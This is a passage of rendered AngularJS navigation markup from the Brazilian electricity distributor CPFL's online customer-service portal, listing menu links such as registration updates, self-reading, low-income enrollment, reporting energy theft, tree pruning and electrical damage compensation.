                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/envio-documentos"
                                                                ui-sref="app.envio-documentos" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Envio Documentos</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/desligamento-programado"
                                                                ui-sref="app.desligamento-programado" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Desligamento
                                                                    programado</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/reformar-padrao-entrada"
                                                                ui-sref="app.reformar-padrao-entrada" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Reformar o meu poste
                                                                    padrão</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/alteracao-carga"
                                                                ui-sref="app.alteracao-carga" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Alteração de
                                                                    carga</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/auto-leitura"
                                                                ui-sref="app.auto-leitura" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Autoleitura</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                    </ul>
                                                </div><!-- end ngIf: item.items.length > 0 -->
                                            </li><!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                            <!-- end ngRepeat: item in ::items -->
                                        </ul>
                                    </div><!-- end ngIf: menuCtrl.itemsMenuLoaded -->
                                </div>
                            </section><!-- end ngIf: menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                            <!-- ngIf: menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                            <section class="menu-section panel ng-scope"
                                ng-if="menuCtrl.getClientId() != &#39;agencia-virtual-cpfl-credenciados&#39;"><a
                                    data-toggle="collapse" data-parent="#boxMenusMobiles" data-target="#menuMeuCadastro"
                                    aria-expanded="false" translate="@APP-COMMON-MENU-MEU-CADASTRO" class="ng-scope">Meu
                                    cadastro</a>
                                <div class="collapse" id="menuMeuCadastro">
                                    <!-- ngIf: menuCtrl.itemsMenuLoaded -->
                                    <div ng-if="menuCtrl.itemsMenuLoaded" class="ng-scope">
                                        <ul suffix=" "
                                            class="site-menu menu-section-list list-menu-sub ng-isolate-scope"
                                            name="menuMeuCadastro">
                                            <!-- ngRepeat: item in ::items -->
                                            <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                            <li ng-repeat="item in ::items"
                                                ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                class="ng-scope">
                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                <!-- ngIf: item.items.length > 0 -->
                                                <div ng-if="item.items.length &gt; 0" class="ng-scope">
                                                    <ul suffix=" " items="item.items" class="ng-isolate-scope">
                                                        <!-- ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/meus-dados"
                                                                ui-sref="app.meus-dados" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Atualizar
                                                                    cadastro</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/consulta-solicitacao"
                                                                ui-sref="app.consulta-solicitacao" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Meus pedidos</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/baixa-renda"
                                                                ui-sref="app.baixa-renda" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Cadastro de Baixa
                                                                    Renda</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/atualizacao-conjuge"
                                                                ui-sref="app.atualizacao-conjuge" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Atualização de
                                                                    cônjuge</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/contrato-fornecimento"
                                                                ui-sref="app.contrato-fornecimento" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Contrato de
                                                                    fornecimento</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/revisao-cadastral"
                                                                ui-sref="app.revisao-cadastral" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Revisão cadastral</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/reprogramacao-nota-servico"
                                                                ui-sref="app.reprogramacao-ns" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Reprogramação de Nota de
                                                                    Serviço</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/cadastro-uti-domiciliar"
                                                                ui-sref="app.cadastro-uti-domiciliar" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Cadastro de UTI
                                                                    domiciliar</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/autorizado-xml-nf3e"
                                                                ui-sref="app.autorizado-xml-nf3e" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Autorizados XML</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                    </ul>
                                                </div><!-- end ngIf: item.items.length > 0 -->
                                            </li><!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                            <!-- end ngRepeat: item in ::items -->
                                        </ul>
                                    </div><!-- end ngIf: menuCtrl.itemsMenuLoaded -->
                                </div>
                            </section><!-- end ngIf: menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                            <!-- ngIf: menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                            <section class="menu-section panel ng-scope"
                                ng-if="menuCtrl.getClientId() != &#39;agencia-virtual-cpfl-credenciados&#39;"><a
                                    data-toggle="collapse" data-parent="#boxMenusMobiles"
                                    data-target="#menuOutrosServicos" aria-expanded="false"
                                    translate="@APP-COMMON-MENU-OUTROS-SERVICOS" class="ng-scope">Outros serviços</a>
                                <div class="collapse" id="menuOutrosServicos">
                                    <!-- ngIf: menuCtrl.itemsMenuLoaded -->
                                    <div ng-if="menuCtrl.itemsMenuLoaded" class="ng-scope">
                                        <ul suffix=" "
                                            class="site-menu menu-section-list list-menu-sub ng-isolate-scope"
                                            name="menuOutrosServicos">
                                            <!-- ngRepeat: item in ::items -->
                                            <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                            <li ng-repeat="item in ::items"
                                                ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                class="ng-scope open">
                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                <!-- ngIf: item.items.length > 0 -->
                                                <div ng-if="item.items.length &gt; 0" class="ng-scope">
                                                    <ul suffix=" " items="item.items" class="ng-isolate-scope">
                                                        <!-- ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/denuncia-furto"
                                                                ui-sref="app.denuncia-furto" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Denunciar furto de
                                                                    energia</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/reparos-ip"
                                                                ui-sref="app.reparos-ip" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Reparos de iluminação
                                                                    pública</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/poda-arvore"
                                                                ui-sref="app.poda-arvore" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Poda de árvore</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/doacoes"
                                                                ui-sref="app.doacoes" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Doações</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/documentos-de-inspecao"
                                                                ui-sref="app.documentos-de-inspecao" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Documentos de
                                                                    Inspeção</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/indenizacao-danos"
                                                                ui-sref="app.indenizacao-danos" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Ressarcimento de Danos
                                                                    Elétricos</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
